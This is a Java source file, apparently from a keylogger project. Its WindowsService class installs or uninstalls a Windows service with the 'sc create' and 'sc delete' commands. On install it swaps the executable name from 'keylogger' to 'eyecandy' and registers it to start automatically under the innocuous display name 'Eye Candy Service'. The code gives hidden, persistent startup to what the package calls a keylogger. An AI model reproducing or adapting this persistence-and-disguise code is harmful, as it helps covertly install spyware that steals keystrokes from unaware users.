package com.badar.keylogger.Services;

import java.io.File;
import java.io.IOException;

public class WindowsService {
    public static void main(String[] args) {
        if (args.length > 0) {
            if ("install".equalsIgnoreCase(args[0])) {
                installService();
            } else if ("uninstall".equalsIgnoreCase(args[0])) {
                uninstallService();
            }
        }
    }

    private static void installService() {
        try {
            String exePath = new File(WindowsService.class
                    .getProtectionDomain()
                    .getCodeSource()
                    .getLocation()
                    .toURI()).getPath();

            // Ensure we reference eyecandy.exe
            if (!exePath.endsWith("eyecandy.exe")) {
                exePath = exePath.replace("keylogger", "eyecandy");
            }

            String command = "cmd /c sc create EyeCandySvc binPath= \"" +
                    exePath + "\" start= auto DisplayName= \"Eye Candy Service\"";

            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private static void uninstallService() {
        try {
            Runtime.getRuntime().exec("cmd /c sc delete EyeCandySvc");
            System.out.println("Service uninstalled successfully");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
